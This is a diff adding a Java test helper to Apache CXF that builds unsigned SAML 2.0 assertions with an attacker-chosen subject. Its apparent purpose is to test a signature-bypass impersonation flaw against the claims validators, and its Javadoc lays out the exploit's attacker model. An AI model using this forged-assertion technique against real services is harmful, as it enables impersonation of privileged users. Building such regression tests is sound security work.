+package org.apache.cxf.rs.security.oauth2.grants.saml;
+
+import java.io.IOException;
+import java.security.cert.X509Certificate;
+import java.time.Duration;
+import java.time.Instant;
+import java.util.Collections;
+
+import javax.security.auth.callback.Callback;
+import javax.security.auth.callback.CallbackHandler;
+import javax.security.auth.callback.UnsupportedCallbackException;
+
+import org.apache.wss4j.common.saml.SAMLCallback;
+import org.apache.wss4j.common.saml.bean.AudienceRestrictionBean;
+import org.apache.wss4j.common.saml.bean.AuthenticationStatementBean;
+import org.apache.wss4j.common.saml.bean.ConditionsBean;
+import org.apache.wss4j.common.saml.bean.KeyInfoBean;
+import org.apache.wss4j.common.saml.bean.SubjectBean;
+import org.apache.wss4j.common.saml.bean.SubjectConfirmationDataBean;
+import org.apache.wss4j.common.saml.bean.Version;
+
+/**
+ * Builds a fully well-formed SAML 2.0 authentication assertion whose Issuer, Audience,
+ * SubjectConfirmationData and Conditions all pass CXF's claims validators
+ * ({@code SamlAssertionValidator} + {@code SamlOAuthValidator}) -- but which is deliberately
+ * left UNSIGNED by the exploit test (the test never calls {@code signAssertion(...)}).
+ *
+ * <p>The subject name (and hence the identity the OAuth2 token / SecurityContext is created for)
+ * is attacker-chosen and is NOT bound in any way to the TLS client certificate the attacker
+ * happens to present. This is exactly the CGP-qjm4-c96g-8hhw (CWE-345) attacker model: a
+ * lower-trust party holding SOME accepted client certificate submits an unsigned assertion naming
+ * an arbitrary/privileged subject.
+ *
+ * <p>The {@code confirmationMethod} is configurable so the harness can drive every reachable
+ * no-binding branch of {@code AbstractSamlInHandler.checkSubjectConfirmationData}:
+ * <ul>
+ *   <li>Bearer confirmation (checkBearer),</li>
+ *   <li>Sender-Vouches confirmation (checkSenderVouches),</li>
+ *   <li>an unrecognized/custom confirmation method string (all three recogniser loops fall
+ *       through and implicitly return {@code true}),</li>
+ *   <li>no SubjectConfirmation element at all (pass {@code null}).</li>
+ * </ul>
+ */
+public class UnsignedSamlCallbackHandler implements CallbackHandler {
+
+    private final String subjectName;
+    private final String issuer;
+    private final String audienceAndRecipient;
+    private final String confirmationMethod;
+    private final X509Certificate keyInfoCertificate;
+
+    /**
+     * @param confirmationMethod the SubjectConfirmation Method URI to set, or {@code null} to emit
+     *                           a Subject with NO SubjectConfirmation element at all.
+     */
+    public UnsignedSamlCallbackHandler(String subjectName, String issuer, String audienceAndRecipient,
+                                       String confirmationMethod) {
+        this(subjectName, issuer, audienceAndRecipient, confirmationMethod, null);
+    }
+
+    /**
+     * @param keyInfoCertificate a certificate to embed in the SubjectConfirmation's KeyInfo (used to
+     *                           build a genuine Holder-of-Key assertion whose SubjectKeyInfo can be
+     *                           bound to the TLS peer certificate), or {@code null} for none.
+     */
+    public UnsignedSamlCallbackHandler(String subjectName, String issuer, String audienceAndRecipient,
+                                       String confirmationMethod, X509Certificate keyInfoCertificate) {
+        this.subjectName = subjectName;
+        this.issuer = issuer;
+        this.audienceAndRecipient = audienceAndRecipient;
+        this.confirmationMethod = confirmationMethod;
+        this.keyInfoCertificate = keyInfoCertificate;
+    }
+
+    public void handle(Callback[] callbacks) throws IOException, UnsupportedCallbackException {
+        for (Callback value : callbacks) {
+            if (value instanceof SAMLCallback) {
+                SAMLCallback callback = (SAMLCallback) value;
+                callback.setSamlVersion(Version.SAML_20);
+                callback.setIssuer(issuer);
+
+                SubjectBean subjectBean;
+                if (confirmationMethod == null) {
+                    // No SubjectConfirmation element at all.
+                    subjectBean = new SubjectBean();
+                    subjectBean.setSubjectName(subjectName);
+                    subjectBean.setSubjectNameQualifier("www.example.com");
+                } else {
+                    subjectBean = new SubjectBean(subjectName, "www.example.com", confirmationMethod);
+                    SubjectConfirmationDataBean subjectConfirmationData = new SubjectConfirmationDataBean();
+                    subjectConfirmationData.setRecipient(audienceAndRecipient);
+                    subjectConfirmationData.setNotAfter(Instant.now().plus(Duration.ofMinutes(30)));
+                    subjectBean.setSubjectConfirmationData(subjectConfirmationData);
+                    if (keyInfoCertificate != null) {
+                        // Holder-of-Key: embed the certificate in the SubjectConfirmation's KeyInfo so
+                        // the assertion's SubjectKeyInfo can be bound to the TLS peer certificate.
+                        KeyInfoBean keyInfo = new KeyInfoBean();
+                        keyInfo.setCertificate(keyInfoCertificate);
+                        keyInfo.setCertIdentifer(KeyInfoBean.CERT_IDENTIFIER.X509_CERT);
+                        subjectBean.setKeyInfo(keyInfo);
+                    }
+                }
+                callback.setSubject(subjectBean);
+
+                // Conditions: in-window NotBefore/NotOnOrAfter + AudienceRestriction matching the endpoint
+                ConditionsBean conditions = new ConditionsBean();
+                conditions.setNotBefore(Instant.now().minus(Duration.ofMinutes(5)));
+                conditions.setNotAfter(Instant.now().plus(Duration.ofMinutes(30)));
+                AudienceRestrictionBean audienceRestriction = new AudienceRestrictionBean();
+                audienceRestriction.setAudienceURIs(Collections.singletonList(audienceAndRecipient));
+                conditions.setAudienceRestrictions(Collections.singletonList(audienceRestriction));
+                callback.setConditions(conditions);
+
+                AuthenticationStatementBean authBean = new AuthenticationStatementBean();
+                authBean.setSubject(subjectBean);
+                authBean.setAuthenticationInstant(Instant.now());
+                authBean.setAuthenticationMethod("Password");
+                callback.setAuthenticationStatementData(Collections.singletonList(authBean));
+            } else {
+                throw new UnsupportedCallbackException(value, "Unrecognized Callback");
+            }
+        }
+    }
+}
